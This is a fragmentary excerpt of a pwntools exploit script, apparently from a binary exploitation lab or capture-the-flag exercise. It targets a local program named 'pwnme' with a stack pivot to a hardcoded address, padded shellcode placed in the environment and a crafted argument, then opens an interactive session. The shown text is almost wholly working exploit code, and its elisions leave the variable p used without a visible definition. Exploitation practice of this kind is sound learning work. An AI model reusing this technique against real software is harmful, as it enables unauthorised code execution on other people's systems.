...
stack_pivot = p32(0xb7e5e770) # addesp_1100 = 0xb7e5e770
shellcode = "\x41"*294 + p + "\x42"*(100000-294-len(p)) 
...
payload = "%76x" + stack_pivot
log.info(payload)

p = process(['/home/tux/0x06/pwnme', payload], env=environment)
p.interactive()
```